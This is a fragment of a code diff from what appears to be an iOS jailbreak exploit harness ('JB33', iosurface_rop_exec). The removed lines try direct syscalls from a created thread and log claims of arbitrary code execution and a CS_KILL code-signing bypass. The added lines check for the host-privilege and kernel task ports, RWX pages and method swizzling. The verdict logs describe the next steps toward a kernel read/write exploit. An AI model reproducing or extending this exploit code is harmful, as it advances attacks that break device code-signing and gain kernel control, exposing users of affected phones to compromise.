-                    if (threadGetState) {
-                        uint64_t readState5[34];
-                        memset(readState5, 0, sizeof(readState5));
-                        natural_t rc5 = 68;
-                        threadGetState(sysThread, 6, readState5, &rc5);
-
-                        log([NSString stringWithFormat:@"JB33:   syscall(SYS_getpid) x0 = %llu (expect %d)",
-                             (unsigned long long)readState5[0], myPid]);
-                        results[@"syscallX0"] = @(readState5[0]);
-
-                        if ((int)readState5[0] == myPid) {
-                            log(@"JB33:   [!!!!!] Direct syscall via thread WORKS!");
-                            results[@"syscallOK"] = @(1);
-                        }
-                    }
-
-                    if (threadTermFn) threadTermFn(sysThread);
-                }
+            if (hpRet == 0 && hostPriv != 0) {
+                log(@"JB33:   [!!!!!] GOT HOST PRIV PORT — elevated Mach privileges!");
+                results[@"hasHostPriv"] = @(1);
             }
         }
 
@@ -32797,47 +32630,39 @@ void iosurface_rop_exec(ISRLogBlock log, ISRDoneBlock done) {
         // =====================================================================
         log(@"JB33: =============================================");
 
-        int getpidOK = [results[@"getpidMatch"] intValue];
-        int codeExecOK = [results[@"codeExec"] intValue];
-        int csChanged = [results[@"csFlagsChanged"] intValue];
-        int syscallOK = [results[@"syscallOK"] intValue];
+        int rwxOK = [results[@"rwxPageReady"] intValue];
+        int impOK = [results[@"directIMP"] intValue];
+        int hasKernel = [results[@"hasKernelTask"] intValue];
+        int hasHostPriv = [results[@"hasHostPriv"] intValue];
+        int swizzle = [results[@"swizzleAPIs"] intValue];
 
         NSString *verdict = @"ANALYSIS_COMPLETE";
 
-        if (codeExecOK) {
-            verdict = @"FULL_CODE_EXECUTION";
-            log(@"JB33: [!!!!!!] ARBITRARY CODE EXECUTION VIA THREAD!");
-            log(@"JB33: [!!!!!!] CS_KILL bypassed — shellcode runs in new thread");
-            log(@"JB33: [!!!!!!] iPhone 13 Pro Max iOS 27.0 — CODE EXEC ACHIEVED");
-            log(@"JB33: Siguiente: kernel read/write para jailbreak completo");
-        } else if (getpidOK && syscallOK) {
-            verdict = @"FUNCTION_CALL_EXEC";
-            log(@"JB33: [!!!!] Can call signed functions + syscalls via thread");
-            log(@"JB33: This gives us arbitrary function call primitive");
-            log(@"JB33: Can call: dlopen, mprotect, posix_spawn, etc");
-        } else if (getpidOK) {
-            verdict = @"SIGNED_FUNC_CALL";
-            log(@"JB33: [!!!] Can call signed functions via thread_create_running");
-            log(@"JB33: Need to chain calls for full exploit");
-        } else if ([results[@"threadCreateRet"] intValue] == 0) {
-            verdict = @"THREAD_CREATED_NO_EXEC";
-            log(@"JB33: Thread created but function didn't execute as expected");
-            log(@"JB33: May need different thread state setup");
+        if (hasKernel) {
+            verdict = @"KERNEL_TASK_PORT";
+            log(@"JB33: [!!!!!!] KERNEL TASK PORT OBTAINED — full kernel R/W possible!");
+        } else if (hasHostPriv) {
+            verdict = @"HOST_PRIV_PORT";
+            log(@"JB33: [!!!!] Host priv port — can enumerate all tasks");
+        } else if (rwxOK && impOK && swizzle) {
+            verdict = @"EXEC_PRIMITIVES_READY";
+            log(@"JB33: [!!!] RWX pages + direct IMP + swizzle available");
+            log(@"JB33: Can call any signed function, make RWX pages");
+            log(@"JB33: Need kernel exploit to clear CS_KILL for unsigned exec");
+        } else if (impOK) {
+            verdict = @"SIGNED_EXEC_ONLY";
+            log(@"JB33: Can call signed functions via IMP/fptr");
+            log(@"JB33: RWX pages blocked or mprotect failed");
         } else {
-            verdict = @"THREAD_CREATE_FAILED";
-            log([NSString stringWithFormat:@"JB33: thread_create_running failed kr=%d",
-                 [results[@"threadCreateRet"] intValue]]);
+            verdict = @"ANALYSIS_ONLY";
+            log(@"JB33: Exploration complete — see individual results");
         }
 
         results[@"verdict"] = verdict;
         log([NSString stringWithFormat:@"JB33: Verdict: %@", verdict]);
         log(@"JB33: =============================================");
 
-        // Cleanup
-        munmap(threadStack, stackSize);
-        munmap((void *)sharedResult, pageSize);
-
-        isr_checkpoint(@"JB33-rop-exec-checkpoint.json", results);
+        isr_checkpoint(@"JB33-safe-exec-checkpoint.json", results);
         done(results);
     });
 }
